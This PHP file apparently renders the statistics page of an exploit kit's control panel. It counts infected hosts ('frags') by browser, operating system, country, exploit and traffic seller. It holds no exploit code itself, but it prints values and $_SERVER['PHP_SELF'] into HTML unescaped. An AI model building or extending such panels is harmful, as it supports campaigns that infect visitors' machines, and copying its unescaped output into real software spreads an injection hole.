<?php

////////
$exploitsdata = "";
for ($i = 0; $i < count($exploit['exploit']); $i++){
	$exploitsdata .= "
	<tr>
		<td style='border-top: 1px solid white;' align='right'>" . $exploit['exploit'][$i] . "&nbsp;</td>
		<td style='border-top: 1px solid white;' align='right'>" . $exploit['frags'][$i] . "&nbsp;</td>
		<td style='border-top: 1px solid white;' align='right'>" . $exploit['all'][$i] . "&nbsp;</td>
		<td style='border-top: 1px solid white;' align='right'>" . number_format(round(($exploit['all'][$i] / $exploit['frags'][$i] * 100), 2), 2) . "%&nbsp;</td>
	</tr>
	";
}
if (count($exploit['exploit']) == 0){
	$exploitsdata = "<tr><td colspan='4'>Exploit list is empty</td></tr>";
}

////////
$countrysdata = "";
for ($i = 0; $i < count($countrys['country']); $i++){
	$countrysdata .= "
	<tr>
		<td width='27' align='center'><img src='./images/country/" . ($gi->GEOIP_COUNTRY_CODES[$countrys['country'][$i]] ? strtolower($gi->GEOIP_COUNTRY_CODES[$countrys['country'][$i]]) : "OTHER") . ".png' width='16' height='11'></td>
		<td style='border-top: 1px solid white;' align='right'><span style='cursor: default;' title='" . $gi->GEOIP_COUNTRY_NAMES[$countrys['country'][$i]] . "'>" . ($gi->GEOIP_COUNTRY_CODES[$countrys['country'][$i]] ? $gi->GEOIP_COUNTRY_CODES[$countrys['country'][$i]] : "OTHER") . "&nbsp;</span></td>
		<td style='border-top: 1px solid white;' align='right'>" . $countrys['all'][$i] . "&nbsp;</td>
		<td style='border-top: 1px solid white;' align='right'>" . $countrys['frags'][$i] . "&nbsp;</td>
		<td style='border-top: 1px solid white;' align='right'>" . number_format(round(($countrys['frags'][$i] / $countrys['all'][$i] * 100), 2), 2) . "%&nbsp;</td>
	</tr>
	";
}
if (count($countrys['country']) == 0){
	$countrysdata = "<tr><td colspan='5'>Country list is empty</td></tr>";
}

////////
$osdata = "";
for ($i = 0; $i < count($oss['os']); $i++){
	$osdata .= "
	<tr>
		<td width='27' align='center'><img src='./images/os/" . $oss['os'][$i] . ".gif'></td>
		<td style='border-top: 1px solid white;' align='right'>" . (($oss['os'][$i] != "OTHER") ? "<a href='javascript://'onclick=\"if (document.getElementById('os" . $oss['os'][$i] . "').style.display == 'none'){ document.getElementById('os" . $oss['os'][$i] . "').style.display = 'block'; } else { document.getElementById('os" . $oss['os'][$i] . "').style.display = 'none'; }\">" . $oss['os'][$i] . "</a>" : $oss['os'][$i]) . "&nbsp;</td>
		<td style='border-top: 1px solid white;' align='right'>" . $oss['all'][$i] . "&nbsp;</td>
		<td style='border-top: 1px solid white;' align='right'>" . $oss['frags'][$i] . "&nbsp;</td>
		<td style='border-top: 1px solid white;' align='right'>" . number_format(round(($oss['frags'][$i] / $oss['all'][$i] * 100), 2), 2) . "%&nbsp;</td>
	</tr>
	<tr>
		<td colspan='5'>
			<table width='230' border='0' style='display: none;' id='os" . $oss['os'][$i] . "' cellpadding='0' cellspacing='0'>";
	for ($z = 0; $z < count($oss_versions[$oss['os'][$i]]['version']); $z++){
		$osdata .= "
		<tr>
			<td width='76' class='subtbl" . (($z%2 == 0) ? "1" : "2") . "'>" . $oss_versions[$oss['os'][$i]]['version'][$z] . "</td>
			<td width='50' class='subtbl" . (($z%2 == 0) ? "1" : "2") . "'>" . $oss_versions[$oss['os'][$i]]['sum'][$z] . "&nbsp;</td>
			<td width='50' class='subtbl" . (($z%2 == 0) ? "1" : "2") . "'>" . $oss_versions[$oss['os'][$i]]['frags'][$z] . "&nbsp;</td>
			<td width='54' class='subtbl" . (($z%2 == 0) ? "1" : "2") . "'>" . number_format(round(($oss_versions[$oss['os'][$i]]['frags'][$z] / $oss_versions[$oss['os'][$i]]['sum'][$z] * 100), 2), 2) . "%&nbsp;</td>
		</tr>
		";
	}
	$osdata .= "
			</table>
		</td>
	</tr>
	";
}
if (count($oss['os']) == 0){
	$osdata = "<tr><td colspan='4'>Operating system list is empty</td></tr>";
}


////////
$browsersdata = "";
for ($i = 0; $i < count($browsers['browser']); $i++){
	$browsersdata .= "
	<tr>
		<td width='27' align='center'><img src='./images/browsers/" . $browsers['browser'][$i] . ".gif'></td>
		<td style='border-top: 1px solid white;' align='right'>" . (($browsers['browser'][$i] != "OTHER") ? "<a href='javascript://'onclick=\"if (document.getElementById('browser" . $browsers['browser'][$i] . "').style.display == 'none'){ document.getElementById('browser" . $browsers['browser'][$i] . "').style.display = 'block'; } else { document.getElementById('browser" . $browsers['browser'][$i] . "').style.display = 'none'; }\">" . $browsers['browser'][$i] . "</a>" : $browsers['browser'][$i]) . "&nbsp;</td>
		<td style='border-top: 1px solid white;' align='right'>" . $browsers['all'][$i] . "&nbsp;</td>
		<td style='border-top: 1px solid white;' align='right'>" . $browsers['frags'][$i] . "&nbsp;</td>
		<td style='border-top: 1px solid white;' align='right'>" . number_format(round(($browsers['frags'][$i] / $browsers['all'][$i] * 100), 2), 2) . "%&nbsp;</td>
	</tr>
	<tr>
		<td colspan='5'>
			<table width='230' border='0' style='display: none;' id='browser" . $browsers['browser'][$i] . "' cellpadding='0' cellspacing='0'>";
	for ($z = 0; $z < count($browsers_versions[$browsers['browser'][$i]]['version']); $z++){
		$browsersdata .= "
		<tr>
			<td width='76' class='subtbl" . (($z%2 == 0) ? "1" : "2") . "'>" . $browsers_versions[$browsers['browser'][$i]]['version'][$z] . "</td>
			<td width='50' class='subtbl" . (($z%2 == 0) ? "1" : "2") . "'>" . $browsers_versions[$browsers['browser'][$i]]['sum'][$z] . "&nbsp;</td>
			<td width='50' class='subtbl" . (($z%2 == 0) ? "1" : "2") . "'>" . $browsers_versions[$browsers['browser'][$i]]['frags'][$z] . "&nbsp;</td>
			<td width='54' class='subtbl" . (($z%2 == 0) ? "1" : "2") . "'>" . number_format(round(($browsers_versions[$browsers['browser'][$i]]['frags'][$z] / $browsers_versions[$browsers['browser'][$i]]['sum'][$z] * 100), 2), 2) . "%&nbsp;</td>
		</tr>
		";
	}
	$browsersdata .= "
			</table>
		</td>
	</tr>
	";
}
if (count($browsers['browser']) == 0){
	$browsersdata = "<tr><td colspan='4'>Browser list is empty</td></tr>";
}


////////
$seller_id = (isset($_GET['seller_id']) AND $_GET['seller_id'] != '0') ? "&seller_id=" . intval($_GET['seller_id']) : "";
$random = "&random=" . md5(time());


////////
$CONTENT =<<<EOF
<table width="100%">
<tr>
	<td><span style="color: black; font-size: 13px;">Show statistic for</span> <select onchange="location.href='{$_SERVER['PHP_SELF']}?seller_id=' + this.value;"><option value="0">Summary data</option>{$selleroptions}</select><br><br></td>
	<td align="right"><button onclick="if (confirm('Are you sure?')){ location.href = '{$_SERVER['PHP_SELF']}?clear_db=1'; }">Clear all statistics</button></td>
</tr>
</table>


<b style="color: black; font-size: 13px;">Browsers</b>
<table border="0" width="100%" cellpadding="0" cellspacing="0">
<tr>
	<td valign="top" width="490" align="center"><img src="{$_SERVER['PHP_SELF']}?img=browsers{$seller_id}{$random}" width="480" height="180" style="background-color: white;"></td>
	<td valign="top" align="center">


		<table cellpadding="0" cellspacing="0">
		<tr>
			<td width="3"><img src="./images/stl.gif" width="3" height="3"></td>
			<td bgcolor="#273238"></td>
			<td width="3"><img src="./images/str.gif" width="3" height="3"></td>
		</tr>
		<tr>
			<td bgcolor="#273238"></td>
			<td bgcolor="#273238" style="padding: 5px;">

				<table border="0" width="230" cellpadding="0" cellspacing="0">
				<tr>
					<td>&nbsp;</td>
					<td>&nbsp;</td>
					<td align='right' width='50'><b class="tst">Hosts</b>&nbsp;</td>
					<td align='right' width='50'><b class="tst">Frags</b>&nbsp;</td>
					<td align='right' width='54'><b class="tst">Percent</b>&nbsp;</td>
				</tr>
				{$browsersdata}
				</table>

			</td>
			<td bgcolor="#273238"></td>
		</tr>
		<tr>
			<td><img src="./images/sbl.gif" width="3" height="3"></td>
			<td bgcolor="#273238"></td>
			<td><img src="./images/sbr.gif" width="3" height="3"></td>
		</tr>
		</table>

	</td>
</tr>
</table>

<br>
<b style="color: black; font-size: 13px;">Operating systems</b>
<table border="0" width="100%">
<tr>
	<td valign="top" width="490" align="center"><img src="{$_SERVER['PHP_SELF']}?img=os{$seller_id}{$random}" width="480" height="180" style="background-color: white;"></td>
	<td valign="top" align="center">

		<table cellpadding="0" cellspacing="0">
		<tr>
			<td width="3"><img src="./images/stl.gif" width="3" height="3"></td>
			<td bgcolor="#273238"></td>
			<td width="3"><img src="./images/str.gif" width="3" height="3"></td>
		</tr>
		<tr>
			<td bgcolor="#273238"></td>
			<td bgcolor="#273238" style="padding: 5px;">

				<table border="0" width="230" cellpadding="0" cellspacing="0">
				<tr>
					<td>&nbsp;</td>
					<td>&nbsp;</td>
					<td align='right' width='50'><b class="tst">Hosts</b>&nbsp;</td>
					<td align='right' width='50'><b class="tst">Frags</b>&nbsp;</td>
					<td align='right' width='54'><b class="tst">Percent</b>&nbsp;</td>
				</tr>
				{$osdata}
				</table>

			</td>
			<td bgcolor="#273238"></td>
		</tr>
		<tr>
			<td><img src="./images/sbl.gif" width="3" height="3"></td>
			<td bgcolor="#273238"></td>
			<td><img src="./images/sbr.gif" width="3" height="3"></td>
		</tr>
		</table>

	</td>
</tr>
</table>

<br>
<b style="color: black; font-size: 13px;">Countries</b>
<table border="0" width="100%">
<tr>
	<td valign="top" width="490" align="center"><img src="{$_SERVER['PHP_SELF']}?img=country{$seller_id}{$random}" width="480" height="180" style="background-color: white;"></td>
	<td valign="top" align="center">

		<table cellpadding="0" cellspacing="0">
		<tr>
			<td width="3"><img src="./images/stl.gif" width="3" height="3"></td>
			<td bgcolor="#273238"></td>
			<td width="3"><img src="./images/str.gif" width="3" height="3"></td>
		</tr>
		<tr>
			<td bgcolor="#273238"></td>
			<td bgcolor="#273238" style="padding: 5px;">

				<table border="0" width="230" cellpadding="0" cellspacing="0">
				<tr>
					<td>&nbsp;</td>
					<td>&nbsp;</td>
					<td align='right' width='50'><b class="tst">Hosts</b>&nbsp;</td>
					<td align='right' width='50'><b class="tst">Frags</b>&nbsp;</td>
					<td align='right' width='54'><b class="tst">Percent</b>&nbsp;</td>
				</tr>
				{$countrysdata}
				</table>

			</td>
			<td bgcolor="#273238"></td>
		</tr>
		<tr>
			<td><img src="./images/sbl.gif" width="3" height="3"></td>
			<td bgcolor="#273238"></td>
			<td><img src="./images/sbr.gif" width="3" height="3"></td>
		</tr>
		</table>

	</td>
</tr>
</table>

<br>
<b style="color: black; font-size: 13px;">Exploits</b>
<table border="0" width="100%">
<tr>
	<td valign="top" width="490" align="center"><img src="{$_SERVER['PHP_SELF']}?img=exploits{$seller_id}{$random}" width="480" height="180" style="background-color: white;"></td>
	<td valign="top" align="center">

		<table cellpadding="0" cellspacing="0">
		<tr>
			<td width="3"><img src="./images/stl.gif" width="3" height="3"></td>
			<td bgcolor="#273238"></td>
			<td width="3"><img src="./images/str.gif" width="3" height="3"></td>
		</tr>
		<tr>
			<td bgcolor="#273238"></td>
			<td bgcolor="#273238" style="padding: 5px;">

				<table border="0" width="230" cellpadding="0" cellspacing="0">
				<tr>
					<td>&nbsp;</td>
					<td align='right'><b class="tst">Frags</b>&nbsp;</td>
					<td align='right'><b class="tst">Feedbacks</b>&nbsp;</td>
					<td align='right'><b class="tst">Percent</b>&nbsp;</td>
				</tr>
				{$exploitsdata}
				</table>

			</td>
			<td bgcolor="#273238"></td>
		</tr>
		<tr>
			<td><img src="./images/sbl.gif" width="3" height="3"></td>
			<td bgcolor="#273238"></td>
			<td><img src="./images/sbr.gif" width="3" height="3"></td>
		</tr>
		</table>

	</td>
</tr>
</table>







EOF;


?>